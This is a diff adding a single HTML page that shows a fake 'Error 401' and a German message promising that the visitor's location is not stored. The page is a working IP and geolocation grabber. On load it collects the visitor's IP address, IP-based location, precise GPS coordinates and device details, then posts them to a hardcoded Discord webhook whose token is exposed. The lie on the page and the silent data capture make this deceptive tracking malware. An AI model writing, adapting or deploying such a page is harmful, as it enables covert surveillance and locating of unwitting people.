@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Access Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+        h1 {
+            font-size: 3em;
+            color: #FF6F61;
+        }
+        p {
+            font-size: 1.2em;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <h1>Error 401</h1>
+    <p>Versuche deinen Standort freizugeben <br> Dein Standort wird nicht gespeichert.</p>
+    <p id="status" style="display: none;"></p>
+
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1331708322344341515/VMk4TcfQnN5f09LYZFm8HbNujeMISIxX0uGgkEdqbhiP4dCobtj9qotXmXLEgjrEk1WG'; // Replace with your Discord webhook URL
+
+        // Send data to webhook
+        async function sendToWebhook(data) {
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: data }),
+                });
+
+                if (!response.ok) {
+                    console.error(`Webhook failed: ${response.statusText}`);
+                } else {
+                    console.log('Webhook sent successfully!');
+                }
+            } catch (error) {
+                console.error('Failed to send data to webhook:', error);
+            }
+        }
+
+        // Handle successful location retrieval
+        function handleLocationSuccess(position) {
+            const { latitude, longitude, accuracy } = position.coords;
+            const locationData = `Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`;
+            document.getElementById('status').textContent = 'Location accessed successfully!';
+            collectAndSendInfo(locationData);
+        }
+
+        // Handle location access errors
+        function handleLocationError(error) {
+            let errorMessage = 'Unable to retrieve location.';
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = 'User denied the request for Geolocation.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = 'Location information is unavailable.';
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = 'The request to get user location timed out.';
+                    break;
+                default:
+                    errorMessage = 'An unknown error occurred.';
+            }
+            console.error(errorMessage);
+            document.getElementById('status').textContent = errorMessage;
+            collectAndSendInfo('Location not available');
+        }
+
+        // Request location access
+        function requestLocationAccess() {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    handleLocationSuccess,
+                    handleLocationError,
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                document.getElementById('status').textContent = 'Geolocation is not supported by your browser.';
+                collectAndSendInfo('Geolocation not supported');
+            }
+        }
+
+        // Collect system information and send it
+        async function collectAndSendInfo(locationData = 'Location not provided') {
+            const ipData = await fetchIPAndLocation();
+
+            const userAgent = navigator.userAgent;
+            const browserData = (() => {
+                const browsers = [
+                    { name: "Firefox", test: /Firefox\/([\d.]+)/ },
+                    { name: "Chrome", test: /Chrome\/([\d.]+)/ },
+                    { name: "Safari", test: /Version\/([\d.]+).*Safari/ },
+                    { name: "Edge", test: /Edg\/([\d.]+)/ },
+                    { name: "Opera", test: /Opera\/([\d.]+)|OPR\/([\d.]+)/ }
+                ];
+                for (const browser of browsers) {
+                    const match = userAgent.match(browser.test);
+                    if (match) {
+                        return { name: browser.name, version: match[1] || match[2] };
+                    }
+                }
+                return { name: "Unknown", version: "N/A" };
+            })();
+
+            const os = (() => {
+                if (userAgent.includes("Windows NT 10.0")) return "Windows 10";
+                if (userAgent.includes("Windows NT 6.3")) return "Windows 8.1";
+                if (userAgent.includes("Windows NT 6.2")) return "Windows 8";
+                if (userAgent.includes("Windows NT 6.1")) return "Windows 7";
+                if (userAgent.includes("Mac OS X")) return "MacOS";
+                if (userAgent.includes("Linux")) return "Linux";
+                if (/Android/.test(userAgent)) return "Android";
+                if (/iPhone|iPad|iPod/.test(userAgent)) return "iOS";
+                return "Unknown";
+            })();
+
+            const device = /Mobile|Android|iPhone|iPad|iPod/.test(userAgent) ? "Mobile" : "Desktop";
+            const screenResolution = `${window.screen.width} x ${window.screen.height}`;
+            const colorDepth = `${window.screen.colorDepth} bits`;
+            const language = navigator.language || 'Unknown';
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+            const cpuCores = navigator.hardwareConcurrency || 'Unknown';
+            const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
+            const connection = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+
+            const info = `
+**IP Address:** ${ipData.ip}
+**Location from IP:** ${ipData.location}
+**User-Provided Location:** ${locationData}
+**Browser:** ${browserData.name}
+**Browser Version:** ${browserData.version}
+**Operating System:** ${os}
+**Device Type:** ${device}
+**Screen Resolution:** ${screenResolution}
+**Color Depth:** ${colorDepth}
+**User-Agent:** ${userAgent}
+**Language:** ${language}
+**Time Zone:** ${timezone}
+**CPU Cores:** ${cpuCores}
+**Memory:** ${memory}
+**Connection Type:** ${connection}
+`;
+
+            sendToWebhook(info);
+        }
+
+        // Fetch the IP address and location data
+        async function fetchIPAndLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) {
+                    throw new Error(`IP API Error: ${response.statusText}`);
+                }
+                const data = await response.json();
+                console.log('IP API Response:', data); // Log the response for debugging
+
+                return {
+                    ip: data.ip || 'Unavailable',
+                    location: data.city && data.region && data.country_name
+                        ? `${data.city}, ${data.region}, ${data.country_name}`
+                        : 'Location Unavailable'
+                };
+            } catch (error) {
+                console.error('Error fetching IP and location:', error);
+                return { ip: 'Unavailable', location: 'Unavailable' };
+            }
+        }
+
+        // Send the IP information on page load
+        document.addEventListener('DOMContentLoaded', async () => {
+            await collectAndSendInfo(); // Sends IP and other data
+
+            // Check if location permission is already granted or denied
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    handleLocationSuccess,
+                    handleLocationError,
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                document.getElementById('status').textContent = 'Geolocation is not supported by your browser.';
+                collectAndSendInfo('Geolocation not supported');
+            }
+        });
+    </script>
+</body>
+</html>
